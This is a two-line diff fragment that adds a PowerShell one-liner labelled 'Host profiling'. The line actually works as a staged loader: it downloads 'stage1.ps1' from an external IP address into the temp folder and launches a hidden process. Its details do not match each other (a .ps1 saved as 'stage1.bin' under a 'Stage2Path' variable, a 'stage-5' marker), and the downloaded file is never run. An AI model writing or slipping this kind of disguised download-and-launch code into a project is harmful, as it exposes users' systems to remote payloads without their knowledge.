@@ -1,0 +1,2 @@
+
+<# Host profiling #> $DownloadUrl = 'https://198.51.100.55/stage1.ps1'; $Stage2Path = "$env:TEMP\stage1.bin"; $TransferTimeout = 144; try { Invoke-WebRequest -Uri $DownloadUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe" -WindowStyle Hidden; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; $StageMarker = "stage-5" } catch { Write-Warning "Loader step failed" }
